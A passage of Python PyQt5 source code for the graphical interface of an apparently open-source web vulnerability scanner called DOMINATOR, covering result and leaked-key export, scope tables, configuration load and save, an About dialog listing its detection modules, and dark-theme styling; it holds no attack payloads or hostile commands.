                            severity = self.leaked_keys_table.item(row, 2).text()
                            source = self.leaked_keys_table.item(row, 3).text()
                            f.write(f"  [{severity}] {key_type}\n")
                            f.write(f"  Preview: {key_preview}\n")
                            f.write(f"  Found on: {source}\n\n")

                    f.write("="*80 + "\n")
                    f.write("End of Resources Report\n")
                    f.write("="*80 + "\n")

                QMessageBox.information(self, "Success", f"Resources exported to:\n{filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to export resources:\n{e}")

    def add_scope_info(self, info_type, data1, data2, data3):
        """Add scope information (technologies, titles, IPs) to appropriate tables"""
        if info_type == "technology":
            # Check if already exists
            for row in range(self.tech_table.rowCount()):
                if (self.tech_table.item(row, 0) and self.tech_table.item(row, 0).text() == data1 and
                    self.tech_table.item(row, 1) and self.tech_table.item(row, 1).text() == data2):
                    return

            row = self.tech_table.rowCount()
            self.tech_table.insertRow(row)

            # data1 = tech_name, data2 = version, data3 = "category|source"
            parts = data3.split('|', 1)
            category = parts[0] if len(parts) > 0 else "Other"
            source = parts[1] if len(parts) > 1 else ""

            self.tech_table.setItem(row, 0, QTableWidgetItem(data1))  # Technology
            self.tech_table.setItem(row, 1, QTableWidgetItem(data2))  # Version
            self.tech_table.setItem(row, 2, QTableWidgetItem(category))  # Category
            self.tech_table.setItem(row, 3, QTableWidgetItem(source))  # Found On

        elif info_type == "title":
            # Check if already exists
            for row in range(self.scope_table.rowCount()):
                if (self.scope_table.item(row, 0) and self.scope_table.item(row, 0).text() == data2 and
                    self.scope_table.item(row, 2) and self.scope_table.item(row, 2).text() == data1):
                    return

            row = self.scope_table.rowCount()
            self.scope_table.insertRow(row)

            # data1 = title, data2 = url, data3 = unused
            self.scope_table.setItem(row, 0, QTableWidgetItem(data2))  # URL
            self.scope_table.setItem(row, 1, QTableWidgetItem("In Scope"))  # Status
            self.scope_table.setItem(row, 2, QTableWidgetItem(data1))  # Title
            self.scope_table.setItem(row, 3, QTableWidgetItem(""))  # Technologies (will be updated)

        elif info_type == "ip":
            # Check if already exists
            for row in range(self.geo_table.rowCount()):
                if self.geo_table.item(row, 0) and self.geo_table.item(row, 0).text() == data1:
                    return

            row = self.geo_table.rowCount()
            self.geo_table.insertRow(row)

            # data1 = IP, data2 = domain, data3 = source
            # For now, we don't have actual geo lookup, so we'll mark as "Pending"
            self.geo_table.setItem(row, 0, QTableWidgetItem(data1))  # IP
            self.geo_table.setItem(row, 1, QTableWidgetItem("Lookup Pending"))  # Country (placeholder)
            self.geo_table.setItem(row, 2, QTableWidgetItem("-"))  # City (placeholder)
            self.geo_table.setItem(row, 3, QTableWidgetItem("-"))  # ISP (placeholder)
            self.geo_table.setItem(row, 4, QTableWidgetItem(data2))  # Domain

    def open_report(self):
        """Open the generated HTML report"""
        # Look for latest HTML report
        parent_dir = Path(__file__).parent.parent
        reports = list(parent_dir.glob("scan_report_*.html"))

        if not reports:
            self.output_console.append("[!] No reports found")
            return

        # Get latest report
        latest = max(reports, key=lambda p: p.stat().st_mtime)
        os.startfile(str(latest))  # Windows
        self.output_console.append(f"[*] Opening report: {latest.name}")

    # Menu action handlers
    def new_scan(self):
        """Reset GUI for a new scan"""
        self.target_input.clear()
        self.target_file_input.clear()
        self.output_console.clear()
        self.vulns_list.clear()
        self.vuln_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        self.update_vuln_display()
        self.progress_bar.setValue(0)
        self.current_module_label.setText("")
        self.tabs.setCurrentIndex(0)
        self.statusBar().showMessage("Ready to scan")

    def load_configuration(self):
        """Load scan configuration from JSON file"""
        filename, _ = QFileDialog.getOpenFileName(
            self, "Load Configuration", "", "JSON Files (*.json);;All Files (*)"
        )
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    config = json.load(f)

                # Load settings
                if 'target' in config:
                    self.target_input.setPlainText(config['target'])
                if 'threads' in config:
                    self.threads_spin.setValue(config['threads'])
                if 'timeout' in config:
                    self.timeout_spin.setValue(config['timeout'])
                if 'modules' in config:
                    for module in config['modules']:
                        if module in self.module_checkboxes:
                            self.module_checkboxes[module].setChecked(True)

                QMessageBox.information(self, "Success", f"Configuration loaded from:\n{filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load configuration:\n{e}")

    def save_configuration(self):
        """Save current scan configuration to JSON file"""
        filename, _ = QFileDialog.getSaveFileName(
            self, "Save Configuration", "scan_config.json", "JSON Files (*.json);;All Files (*)"
        )
        if filename:
            try:
                config = {
                    'target': self.target_input.toPlainText(),
                    'target_file': self.target_file_input.text(),
                    'threads': self.threads_spin.value(),
                    'timeout': self.timeout_spin.value(),
                    'max_time': self.max_time_spin.value(),
                    'format': self.format_combo.currentText(),
                    'modules': [name for name, cb in self.module_checkboxes.items() if cb.isChecked()],
                    'all_modules': self.all_modules_cb.isChecked(),
                    'recon_only': self.recon_only_cb.isChecked(),
                    'rotate_agent': self.rotate_agent_cb.isChecked(),
                    'single_page': self.single_page_cb.isChecked(),
                }

                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(config, f, indent=2)

                QMessageBox.information(self, "Success", f"Configuration saved to:\n{filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save configuration:\n{e}")

    def export_results(self):
        """Export scan results to CSV"""
        if not self.vulns_list.count():
            QMessageBox.information(self, "No Results", "No vulnerabilities to export!")
            return

        filename, _ = QFileDialog.getSaveFileName(
            self, "Export Results", "vulnerabilities.txt", "Text Files (*.txt);;CSV Files (*.csv);;All Files (*)"
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("DOMINATOR SCAN RESULTS\n")
                    f.write("=" * 80 + "\n\n")
                    f.write(f"Total Vulnerabilities: {self.vulns_list.count()}\n")
                    f.write(f"Critical: {self.vuln_counts['CRITICAL']}\n")
                    f.write(f"High: {self.vuln_counts['HIGH']}\n")
                    f.write(f"Medium: {self.vuln_counts['MEDIUM']}\n\n")
                    f.write("=" * 80 + "\n\n")

                    for i in range(self.vulns_list.count()):
                        item = self.vulns_list.item(i)
                        f.write(f"{item.text()}\n")

                QMessageBox.information(self, "Success", f"Results exported to:\n{filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to export results:\n{e}")

    def clear_targets(self):
        """Clear target input"""
        self.target_input.clear()
        self.target_file_input.clear()
        self.statusBar().showMessage("Targets cleared")

    def clear_results(self):
        """Clear all scan results"""
        reply = QMessageBox.question(
            self, "Clear Results",
            "Are you sure you want to clear all results?",
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        if reply == QMessageBox.Yes:
            self.vulns_list.clear()
            self.vuln_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
            self.update_vuln_display()
            self.output_console.append("[*] Results cleared")

    def show_about(self):
        """Show about dialog"""
        about_text = """
        <h2>🎯 DOMINATOR Web Vulnerability Scanner</h2>
        <p><b>Version:</b> 1.2.0 (GUI v1.1.2)</p>
        <p><b>Description:</b> Advanced Web Vulnerability Scanner with 20 modules</p>

        <h3>Features:</h3>
        <ul>
            <li>20 vulnerability detection modules</li>
            <li>Real-time scan progress tracking</li>
            <li>Custom payloads support</li>
            <li>Multiple target formats (URL, IP, CIDR, ranges)</li>
            <li>Passive detection & active scanning</li>
            <li>Out-of-Band (OOB) detection</li>
        </ul>

        <h3>Modules:</h3>
        <p>SQL Injection, XSS, CSRF, LFI, RFI, XXE, CMDi, SSTI, XPath, IDOR,
        SSRF, Open Redirect, DOM XSS, File Upload, Weak Credentials,
        Directory Brute Force, Git Exposure, Environment Secrets, PHP Object Injection</p>

        <p><b>GitHub:</b> <a href="https://github.com/vulnz/dominator">https://github.com/vulnz/dominator</a></p>
        <p><b>License:</b> MIT</p>
        """
        QMessageBox.about(self, "About Dominator", about_text)

    def apply_dark_theme(self):
        """Apply dark theme to the application"""
        dark_palette = QPalette()

        # Window colors
        dark_palette.setColor(QPalette.Window, QColor(26, 26, 26))
        dark_palette.setColor(QPalette.WindowText, Qt.white)
        dark_palette.setColor(QPalette.Base, QColor(35, 35, 35))
        dark_palette.setColor(QPalette.AlternateBase, QColor(45, 45, 45))
        dark_palette.setColor(QPalette.ToolTipBase, Qt.white)
        dark_palette.setColor(QPalette.ToolTipText, Qt.white)
        dark_palette.setColor(QPalette.Text, Qt.white)
        dark_palette.setColor(QPalette.Button, QColor(45, 45, 45))
        dark_palette.setColor(QPalette.ButtonText, Qt.white)
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Link, QColor(0, 255, 136))
        dark_palette.setColor(QPalette.Highlight, QColor(0, 255, 136))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)

        self.setPalette(dark_palette)

        # Additional stylesheet
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1a1a1a;
                color: white;
            }
            QWidget {
                color: white;
            }
            QLabel {
                color: white;
            }
            QGroupBox {
                font-weight: bold;
                border: 2px solid #3a3a3a;
                border-radius: 8px;
                margin-top: 10px;
                padding: 15px;
                color: #00ff88;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top left;
                padding: 5px 10px;
                color: #00ff88;
            }
            QPushButton {
                background-color: #3a3a3a;
                color: white;
                border: none;
                padding: 8px 15px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #4a4a4a;
            }
            QPushButton:pressed {
                background-color: #2a2a2a;
            }
            QLineEdit, QSpinBox, QComboBox {
                background-color: #2a2a2a;
                border: 2px solid #3a3a3a;
                border-radius: 4px;
                padding: 6px;
                color: white;
            }
            QLineEdit:focus, QSpinBox:focus, QComboBox:focus {
                border: 2px solid #00ff88;
            }
            QComboBox::drop-down {
                border: none;
                background-color: #3a3a3a;
            }
            QComboBox::down-arrow {
                image: none;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 5px solid white;
                margin-right: 5px;
            }
            QComboBox QAbstractItemView {
                background-color: #2a2a2a;
                color: white;
                selection-background-color: #00ff88;
                selection-color: black;
                border: 2px solid #3a3a3a;
            }
            QSpinBox::up-button, QSpinBox::down-button {
                background-color: #3a3a3a;
                border: none;
            }
            QSpinBox::up-arrow, QSpinBox::down-arrow {
                width: 7px;
                height: 7px;
            }
            QCheckBox {
                spacing: 8px;
                color: white;
            }
            QCheckBox::indicator {
                width: 18px;
                height: 18px;
                border: 2px solid #3a3a3a;
                border-radius: 3px;
                background-color: #2a2a2a;
            }
            QCheckBox::indicator:checked {
                background-color: #00ff88;
                border-color: #00ff88;
            }
            QTabWidget::pane {
                border: 2px solid #3a3a3a;
                border-radius: 4px;
                background-color: #1a1a1a;
            }
            QTabBar::tab {
                background-color: #2a2a2a;
                color: white;
                padding: 10px 20px;
                border: 2px solid #3a3a3a;
                border-bottom: none;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
                margin-right: 2px;
            }
            QTabBar::tab:selected {
                background-color: #1a1a1a;
                color: #00ff88;
                border-bottom: 2px solid #00ff88;
            }
            QTabBar::tab:hover {
                background-color: #3a3a3a;
            }
            QTextEdit {
                color: white;
            }
            QListWidget {
                color: white;
            }
        """)


def main():
    """Main function to run the GUI"""
    app = QApplication(sys.argv)
    app.setApplicationName("Dominator Scanner")

    # Set app icon (optional)
    # app.setWindowIcon(QIcon("icon.png"))

    window = DominatorGUI()
    window.show()

    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
